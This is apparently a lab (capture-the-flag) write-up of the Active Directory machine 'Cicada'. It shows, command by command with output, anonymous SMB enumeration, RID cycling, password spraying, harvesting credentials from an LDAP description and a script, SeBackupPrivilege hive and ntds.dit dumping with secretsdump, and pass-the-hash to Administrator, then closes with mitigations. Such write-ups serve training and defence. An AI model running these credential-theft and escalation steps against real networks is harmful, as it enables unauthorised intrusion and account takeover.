---
title: 'Cicada: Chirping Credentials — From Default Password to Domain Admin'
published: 2026-05-12
description: ''
image: ''
tags: ['Active Directory']
category: 'Penetration Tester'
draft: false 
lang: ''
---

# Introduction

This is Cicada, a  Windows Active Directory machine which attack path involves enumerating SMB shares to find a default password in a welcome note, performing RID cycling to discover usernames, and password spraying to find a user still using the default credentials. After gaining a foothold with one user, LDAP enumeration reveals a password stored in another user's description. That user has access to a DEV share containing a backup script, which leaks further credentials. Finally, the `SeBackupPrivilege` is exploited to dump hashes and achieve domain administrator access.

## Reconnaissance

### Nmap Scan

An initial scan reveals a typical Windows Domain Controller with ports like 53 (DNS), 88 (Kerberos), 389 (LDAP), and 445 (SMB) open. We note the domain name `cicada.htb` and the hostname `CICADA-DC`, and add them to our `/etc/hosts` file.

**Nmap Scan Results:**

```bash
$ nmap -p- -sCV --min-rate 10000 10.10.11.30

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-27 01:58:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
54296/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_  Message signing enabled and required
|_clock-skew: 7h00m08s
| smb2-time:
|   date: 2024-09-27T01:59:20
|_  start_date: N/A

```

**Adding Domain and Hostname to `/etc/hosts`:**

```
10.10.11.30    CICADA-DC cicada.htb CICADA-DC.cicada.htb
```

**Key Ports and Services Analysis:**

- **SMB (445):** A potential source of files if anonymous access is allowed.
- **LDAP (389):** Could reveal usernames and passwords if anonymous access is permitted.
- **DNS (53):** Possible to brute force subdomains.
- **WinRM (5985):** Will provide a shell if valid credentials are found.


## Gaining a Foothold

### Anonymous SMB Access

We can access SMB shares anonymously using the `guest` account with an empty password.

```bash
# Enumerating SMB shares as guest
$ netexec smb CICADA-DC -u guest -p '' --shares
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\guest:
SMB         10.10.11.30    445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.30    445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.30    445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.30    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.30    445    CICADA-DC        C$                              Default share
SMB         10.10.11.30    445    CICADA-DC        DEV
SMB         10.10.11.30    445    CICADA-DC        HR              READ
SMB         10.10.11.30    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.30    445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.10.11.30    445    CICADA-DC        SYSVOL                          Logon server share
```

**Share Analysis Diagram:**

```
SMB Shares on 10.10.11.30
+-----------------------+-----------------------------+
| Share Name            | Permissions / Notes         |
+-----------------------+-----------------------------+
| ADMIN$, C$            | Default admin shares (inaccessible) |
| IPC$                  | READ (inter-process communication) |
| NETLOGON, SYSVOL      | Standard DC shares           |
| HR                    | READ (accessible!)           |
| DEV                   | No access initially          |
+-----------------------+-----------------------------+
```

### Finding a Default Password

The `HR` share contains a single file, `Notice from HR.txt`. We download and read it.

```bash
# Connecting to the HR share and downloading the file
$ smbclient -N //10.10.11.30/HR
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 942184 blocks available
smb: \\> get "Notice from HR.txt"
getting file \\Notice from HR.txt of size 1266 as Notice from HR.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
smb: \\> exit
```

**Contents of `Notice from HR.txt`:**

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our
security protocols, it's essential that you change your default password to
something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default
password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is
strong, containing a mix of uppercase letters, lowercase letters, numbers, and
special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure.
Please do not share your password with anyone, and ensure you use a complex
password.

If you encounter any issues or need assistance with changing your password, don't
hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the
Cicada Corp team!

Best regards,
Cicada Corp
```

### User Enumeration via RID Cycling

We perform RID (Relative Identifier) cycling to discover domain usernames. RID cycling involves brute-forcing user IDs against the `\\pipe\\lsarpc` endpoint.

```bash
# Performing RID cycling as guest
$ netexec smb CICADA-DC -u guest -p '' --rid-brute 10000
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\guest:
SMB         10.10.11.30    445    CICADA-DC        498: CICADA\\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        500: CICADA\\Administrator (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        501: CICADA\\Guest (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        502: CICADA\\krbtgt (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        512: CICADA\\Domain Admins (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        513: CICADA\\Domain Users (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        514: CICADA\\Domain Guests (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        515: CICADA\\Domain Computers (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        516: CICADA\\Domain Controllers (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        517: CICADA\\Cert Publishers (SidTypeAlias)
SMB         10.10.11.30    445    CICADA-DC        518: CICADA\\Schema Admins (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        519: CICADA\\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        520: CICADA\\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        521: CICADA\\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        522: CICADA\\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        525: CICADA\\Protected Users (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        526: CICADA\\Key Admins (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        527: CICADA\\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        553: CICADA\\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.30    445    CICADA-DC        571: CICADA\\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.30    445    CICADA-DC        572: CICADA\\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.30    445    CICADA-DC        1000: CICADA\\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        1101: CICADA\\DnsAdmins (SidTypeAlias)
SMB         10.10.11.30    445    CICADA-DC        1102: CICADA\\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        1103: CICADA\\Groups (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        1104: CICADA\\john.smoulder (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        1105: CICADA\\sarah.dantelia (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        1106: CICADA\\michael.wrightson (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        1108: CICADA\\david.orelious (SidTypeUser)
SMB         10.10.11.30    445    CICADA-DC        1109: CICADA\\Dev Support (SidTypeGroup)
SMB         10.10.11.30    445    CICADA-DC        1601: CICADA\\emily.oscars (SidTypeUser)
```

We filter the output to create a list of domain users:

```bash
# Extracting usernames from RID cycling output
$ netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 | tee users.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

### Password Spraying

We spray the discovered default password against all usernames.

```bash
# Password spraying with the default password
$ netexec smb CICADA-DC -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.30    445    CICADA-DC        [-] cicada.htb\\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

The password works for `michael.wrightson`. We verify access:

```bash
# Verifying credentials with SMB and LDAP
$ netexec smb CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

# Confirming LDAP access
$ netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.30    389    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

# WinRM access fails (user not in Remote Management group)
$ netexec winrm CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
WINRM       10.10.11.30    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.30    5985   CICADA-DC        [-] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

## Escalating to `david.orelious`

### Enumerating LDAP for Credentials

Since `michael.wrightson` has no additional SMB share access, we turn to LDAP to find more information.

```bash
# Enumerating all LDAP users
$ netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.30    389    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
LDAP        10.10.11.30    389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.10.11.30    389    CICADA-DC        -Username-                    -Last PW Set-            -BadPW-  -Description-
LDAP        10.10.11.30    389    CICADA-DC        Administrator                 2024-08-26 20:08:03      1        Built-in account for administering the computer/domain
LDAP        10.10.11.30    389    CICADA-DC        Guest                         2024-08-28 17:26:56      1        Built-in account for guest access to the computer/domain
LDAP        10.10.11.30    389    CICADA-DC        krbtgt                        2024-03-14 11:14:10      1        Key Distribution Center Service Account
LDAP        10.10.11.30    389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29      1
LDAP        10.10.11.30    389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29      1
LDAP        10.10.11.30    389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29      0
LDAP        10.10.11.30    389    CICADA-DC        david.orelious                2024-03-14 12:17:29      1        Just in case I forget my password is aRt$Lp#7t*VQ!3
LDAP        10.10.11.30    389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17      1
```

**Critical Finding Visual:**

```
+---------------------+---------------------------------------------+
| User                | Description                                 |
+---------------------+---------------------------------------------+
| michael.wrightson   | (none)                                      |
| david.orelious      | Just in case I forget my password is        |
|                     | aRt$Lp#7t*VQ!3                              |
| emily.oscars        | (none)                                      |
+---------------------+---------------------------------------------+
```

The `david.orelious` user's description contains a password: `aRt$Lp#7t*VQ!3`. We validate these credentials:

```bash
# Validating david.orelious credentials over SMB and LDAP
$ netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3

$ netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.30    389    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3

# WinRM still fails for this user
$ netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
WINRM       10.10.11.30    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.30    5985   CICADA-DC        [-] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3
```

### Accessing the DEV Share

Unlike previous users, `david.orelious` has read access to the `DEV` share.

```bash
# Enumerating shares as david.orelious
$ netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3
SMB         10.10.11.30    445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.30    445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.30    445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.30    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.30    445    CICADA-DC        C$                              Default share
SMB         10.10.11.30    445    CICADA-DC        DEV             READ
SMB         10.10.11.30    445    CICADA-DC        HR              READ
SMB         10.10.11.30    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.30    445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.10.11.30    445    CICADA-DC        SYSVOL          READ            Logon server share
```

We connect and download the `Backup_script.ps1` file.

```bash
# Connecting to DEV share and downloading the backup script
$ smbclient -U david.orelious //CICADA-DC/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

		4168447 blocks of size 4096. 934318 blocks available
smb: \\> get Backup_script.ps1
getting file \\Backup_script.ps1 of size 601 as Backup_script.ps1 (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \\> exit
```

**`Backup_script.ps1` Contents Visualized as a Code Block:**

```powershell
$sourceDirectory = "C:\\smb"
$destinationDirectory = "D:\\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)

$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName

Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath

Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

**Key Finding:**

```
+----------------------+------------------------------+
| Variable             | Value                        |
+----------------------+------------------------------+
| Username             | emily.oscars                 |
| Password (plaintext) | Q!3@Lp#M6b*7t*Vt             |
+----------------------+------------------------------+
```

## Shell as `emily.oscars`

### Validating Credentials and Accessing WinRM

The credentials found in the script are valid and grant WinRM access.

```bash
# Validating emily.oscars credentials
$ netexec smb CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt

# Confirming WinRM access
$ netexec winrm CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
WINRM       10.10.11.30    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.30    5985   CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

We connect using Evil-WinRM and retrieve the user flag.

```bash
# Establishing a shell as emily.oscars
$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Documents>

# Reading user flag
*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop> type user.txt
ea4481e2************************
```

**Credentials Chain Summary:**

```
1. Default Password from HR Note: Cicada$M6Corpb*@Lp#nZp!8
   -> Valid for: michael.wrightson (SMB/LDAP only, no WinRM)
2. LDAP Description of david.orelious: aRt$Lp#7t*VQ!3
   -> Valid for: david.orelious (SMB/LDAP only, DEV share access)
3. Password in Backup_script.ps1: Q!3@Lp#M6b*7t*Vt
   -> Valid for: emily.oscars (SMB + WinRM Access!)
```

## Privilege Escalation via `SeBackupPrivilege`

### Identifying the Privilege

`emily.oscars` is a member of the **Backup Operators** group, which grants `SeBackupPrivilege`.

```powershell
# Checking group membership
*Evil-WinRM* PS C:\\> net user emily.oscars
User name                    emily.oscars
Full Name                    Emily Oscars
Comment                      User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2024 2:20:17 PM
Password expires             Never
Password changeable          8/23/2024 2:20:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

```powershell
# Listing privileges
*Evil-WinRM* PS C:\\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================   ======================================   =======
SeBackupPrivilege               Back up files and directories            Enabled
SeRestorePrivilege              Restore files and directories            Enabled
SeShutdownPrivilege             Shut down the system                     Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
```

**Privilege Exploitation Path Diagram:**

```
                   +-----------------------------+
                   | SeBackupPrivilege Enabled   |
                   +-----------------------------+
                                  |
          +-----------------------+-----------------------+
          |                                               |
+---------v----------+                       +------------v----------+
| Method 1: Registry |                       | Method 2: NetExec/    |
| Dump (reg save)    |                       | Impacket Automation   |
+--------------------+                       +-----------------------+
          |                                               |
          v                                               v
   Dump SAM & SYSTEM                      Use reg.py or nxc to dump
   to local files                         ntds.dit remotely
          |                                               |
          +-----------------------+-----------------------+
                                  |
                                  v
                     Extract Administrator Hash
                     via secretsdump.py
                                  |
                                  v
                     Evil-WinRM as Administrator
```

### Exploiting via Registry Dump (Method 1 — Simple)

We save the SAM and SYSTEM registry hives and download them.

```powershell
# Saving registry hives
*Evil-WinRM* PS C:\\programdata> reg save hklm\\sam sam
The operation completed successfully.
*Evil-WinRM* PS C:\\programdata> reg save hklm\\system system
The operation completed successfully.

# Downloading the hive files
*Evil-WinRM* PS C:\\programdata> download sam
Info: Downloading C:\\programdata\\sam to sam
Info: Download successful!
*Evil-WinRM* PS C:\\programdata> download system
Info: Downloading C:\\programdata\\system to system
Info: Download successful!
```

On our local machine, we use `secretsdump.py` to extract the Administrator hash:

```bash
# Dumping local hashes from saved registry hives
$ secretsdump.py -sam sam -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

### Escalating to Administrator

We use the extracted hash to get a shell as Administrator and read the root flag.

```bash
# Authenticating with the Administrator hash
$ netexec smb CICADA-DC -u administrator -H aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
SMB         10.10.11.30    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.30    445    CICADA-DC        [+] cicada.htb\\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)

# Connecting with Evil-WinRM using the hash
$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>

# Reading root flag
*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> type root.txt
b77facd8************************
```

## Beyond Root — Dumping Domain Hashes (Optional)

For a complete compromise, we can also dump domain hashes from `ntds.dit`. This requires using `diskshadow` to create a shadow copy of the `C:` drive because the file is locked by Active Directory.

```powershell
# Step 1: Create the diskshadow script
# (On attacker machine, create a file called 'backup' with the following content)
set verbose on
set metadata C:\\Windows\\Temp\\0xdf.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

```bash
# Convert script to DOS format
$ unix2dos backup
```

```powershell
# Step 2: Upload and run diskshadow
*Evil-WinRM* PS C:\\programdata> diskshadow /s backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer: CICADA-DC, 9/27/2024 1:07:11 AM

-> set verbose on
-> set metadata C:\\Windows\\Temp\\0xdf.cab
-> set context clientaccessible
-> begin backup
-> add volume C: alias cdrive
-> create
Component "\\BCD\\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because
the top-level non selectable component "\\BCD\\BCD" is excluded.
* Including writer "Task Scheduler Writer":
+ Adding component: \\TasksStore
* Including writer "VSS Metadata Store Writer":
+ Adding component: \\WriterMetadataStore
* Including writer "Performance Counters Writer":
+ Adding component: \\...
...
```

```powershell
# Step 3: Copy ntds.dit from the exposed E: drive
Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\programdata\\ntds.dit

# Step 4: Download SAM and SYSTEM hives
reg save HKLM\\SYSTEM C:\\programdata\\SYSTEM.SAV
reg save HKLM\\SAM C:\\programdata\\SAM.SAV
```

```bash
# Step 5: Dump all domain hashes
$ secretsdump.py -sam SAM.SAV -system SYSTEM.SAV -ntds ntds.dit LOCAL
```

**Domain Hashes Visualization:**

```
Extracted Domain Hashes:
+---------------------+---------------------------------------------------+
| User                | NTLM Hash                                        |
+---------------------+---------------------------------------------------+
| Administrator       | 2b87e7c93a3e8a0ea4a581937016f341                 |
| Guest               | 31d6cfe0d16ae931b73c59d7e0c089c0                 |
| CICADA-DC$          | 188c2f3cb7592e18d1eae37991dee696                 |
| krbtgt              | 3779000802a4bb402736bee52963f8ef                 |
| john.smoulder        | 0d33a055d07e231ce088a91975f28dc4                 |
| sarah.dantelia      | d1c88b5c2ecc0e2679000c5c73baea20                 |
| michael.wrightson   | b222964c9f247e6b225ce9e7c4276776                 |
| david.orelious      | ef0bcbf3577b729dcfa6fbe1731d5a43                 |
| emily.oscars        | 559048ab2d168a4edf8e033d43165ee5                 |
+---------------------+---------------------------------------------------+
```

## Cleanup and Defensive Countermeasures

### Summary of Attack Path

1. **Reconnaissance**: Nmap scan identified open ports and services.
2. **SMB Enumeration**: Anonymous access to `HR` share revealed default password.
3. **RID Cycling**: Identified valid domain usernames.
4. **Password Spraying**: Found `michael.wrightson` was still using the default password.
5. **LDAP Enumeration**: Discovered `david.orelious`'s password in his description field.
6. **SMB Access**: `david.orelious` could read the `DEV` share, which contained a backup script.
7. **Script Analysis**: Extracted `emily.oscars`' credentials from the script.
8. **WinRM Access**: `emily.oscars` had WinRM access and `SeBackupPrivilege`.
9. **Privilege Escalation**: Dumped SAM/SYSTEM hives to extract Administrator NTLM hash.
10. **Full Compromise**: Used the hash to log in as Administrator.

### Mitigations

- **Remove default credentials immediately**: Enforce password changes upon first login.
- **Never store passwords in plaintext**: Use secure vaults or proper secrets management.
- **Restrict SMB share access**: Apply principle of least privilege.
- **Monitor LDAP descriptions**: Ensure no sensitive data is stored in user attributes.
- **Review Backup Operators membership**: Limit this group to required accounts only.
- **Enable logging and alerting**: Monitor for suspicious SMB enumeration and registry access.

# Conclusion

Cicada is a classic Active Directory machine that emphasizes the dangers of poor credential management. The path from an anonymous SMB guest to Domain Admin is a realistic scenario often encountered in internal penetration tests. By combining thorough enumeration, credential spraying, and exploitation of Windows privileges, we achieved full compromise of the domain.